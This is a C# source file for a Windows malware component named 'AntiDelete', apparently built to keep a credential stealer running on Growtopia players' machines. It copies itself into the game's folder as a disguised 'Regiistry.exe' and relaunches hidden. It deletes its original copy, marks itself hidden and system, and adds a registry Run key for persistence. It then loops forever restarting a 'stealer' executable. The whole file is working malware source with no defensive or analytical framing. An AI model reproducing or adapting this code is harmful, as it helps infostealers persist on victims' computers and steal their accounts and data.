using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace AntiDelete
{
    static class AntiDelete
    {
        static void Main(string[] args)
        {
            ScanStealer();
        }
        static void ScanStealer()
        {
            try
            {
                try
                {
                    string AntiDeleteProgram = Process.GetCurrentProcess().MainModule.FileName;
                    string AntiDeleteDestination = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\" + "Regiistry.exe";
                    if (AntiDeleteProgram != AntiDeleteDestination)
                    {
                        if (File.Exists(AntiDeleteDestination))
                        {
                            File.Delete(AntiDeleteDestination);
                        }
                        File.Copy(AntiDeleteProgram, AntiDeleteDestination);
                        Process p = new Process();
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.StartInfo.WorkingDirectory = Path.GetDirectoryName(AntiDeleteDestination);
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/c Regiistry.exe";
                        p.Start();
                        ProcessStartInfo Info = new ProcessStartInfo();
                        Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
                                       Application.ExecutablePath;
                        Info.WindowStyle = ProcessWindowStyle.Hidden;
                        Info.CreateNoWindow = true;
                        Info.FileName = "cmd.exe";
                        Process.Start(Info);
                        Application.Exit();
                    }
                    if (AntiDeleteProgram == AntiDeleteDestination)
                    {
                        try
                        {
                            string StealerDestination = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\boop";
                            string[] stealer = Directory.GetFiles(StealerDestination);
                            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }
                            try
                            {
                                RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                                RK.SetValue(Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);
                            }
                            catch
                            {
                            }
                            while (true)
                            {
                                if (!(Process.GetProcessesByName(Path.GetFileNameWithoutExtension(stealer[0])).Length > 0))
                                {
                                    Process q = new Process();
                                    q.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                    q.StartInfo.WorkingDirectory = StealerDestination;
                                    q.StartInfo.FileName = "cmd.exe";
                                    q.StartInfo.Arguments = "/c " + Path.GetFileName(stealer[0]);
                                    q.Start();
                                    Thread.Sleep(5000);
                                }
                                Thread.Sleep(5000);
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
            catch
            {
            }
        }
    }
}
